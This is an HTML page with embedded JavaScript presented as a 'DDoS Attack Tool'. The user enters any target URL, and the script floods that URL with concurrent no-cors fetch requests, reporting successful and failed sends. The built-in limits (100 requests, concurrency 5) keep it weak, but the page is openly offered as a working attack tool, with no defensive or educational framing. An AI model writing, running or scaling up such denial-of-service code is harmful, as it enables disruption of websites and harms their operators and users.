<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>DDoS Attack Tool</title>
<style>
  body {
    background: linear-gradient(135deg, #1c1c1c, #0d0d0d);
    color: #e63946;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    height: 100vh;
    margin: 0;
    padding: 20px;
  }
  h1 {
    margin-bottom: 5px;
    font-weight: 900;
    text-shadow: 0 0 10px #e63946;
  }
  p {
    margin-top: 0;
    margin-bottom: 30px;
    color: #f4f1de;
  }
  label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
  }
  input[type=text], input[type=number] {
    width: 300px;
    padding: 10px;
    border: 2px solid #e63946;
    border-radius: 6px;
    background: #262626;
    color: #e63946;
    font-weight: 600;
    font-size: 16px;
    outline: none;
    margin-bottom: 20px;
    transition: border-color 0.3s;
  }
  input[type=text]:focus, input[type=number]:focus {
    border-color: #f1faee;
  }
  button {
    cursor: pointer;
    background-color: #e63946;
    color: #f1faee;
    border: none;
    border-radius: 8px;
    padding: 12px 30px;
    font-weight: 700;
    font-size: 18px;
    outline: none;
    transition: background-color 0.3s;
  }
  button:hover {
    background-color: #d62828;
  }
  #status {
    margin-top: 30px;
    font-weight: 700;
    font-size: 18px;
    min-height: 24px;
    color: #a8dadc;
    text-align: center;
  }
</style>
</head>
<body>
<h1>DDoS Attack Tool</h1>
<p>Enter target URL, number of requests and concurrency to execute the attack.</p>

<form id="attackForm">
  <label for="targetUrl">Target URL (including protocol):</label>
  <input type="text" id="targetUrl" name="targetUrl" placeholder="https://example.com" required />

  <label for="requestCount">Number of Requests (max 100):</label>
  <input type="number" id="requestCount" name="requestCount" min="1" max="100" value="10" required />

  <label for="concurrency">Concurrency (max 5):</label>
  <input type="number" id="concurrency" name="concurrency" min="1" max="5" value="2" required />

  <button type="submit">Start Attack</button>
</form>

<div id="status"></div>

<script>
  const form = document.getElementById('attackForm');
  const statusDiv = document.getElementById('status');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const url = document.getElementById('targetUrl').value.trim();
    let count = parseInt(document.getElementById('requestCount').value);
    let concurrency = parseInt(document.getElementById('concurrency').value);

    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      alert('Please include the protocol (http:// or https://) in the URL');
      return;
    }
    if (count > 100) count = 100;
    if (concurrency > 5) concurrency = 5;

    statusDiv.textContent = 'Starting attack...';

    // Function to send a single request
    async function sendRequest() {
      try {
        await fetch(url, {
          method: 'GET',
          mode: 'no-cors',
          cache: 'no-cache',
        });
        return true;
      } catch {
        return false;
      }
    }

    // Run requests with concurrency control
    async function runAttack() {
      let completed = 0;
      let active = 0;
      let success = 0;
      let fail = 0;

      return new Promise((resolve) => {
        function next() {
          if (completed >= count) {
            resolve({success, fail});
            return;
          }
          while (active < concurrency && completed + active < count) {
            active++;
            sendRequest()
              .then((res) => {
                if (res) success++; else fail++;
              })
              .catch(() => fail++)
              .finally(() => {
                active--;
                completed++;
                statusDiv.textContent = `Requests sent: ${completed} / ${count} | Successful: ${success} | Failed: ${fail}`;
                next();
              });
          }
        }
        next();
      });
    }

    const result = await runAttack();
    statusDiv.textContent = `Attack complete. Total requests: ${count}, Successful: ${result.success}, Failed: ${result.fail}`;
  });
</script>
</body>
</html>
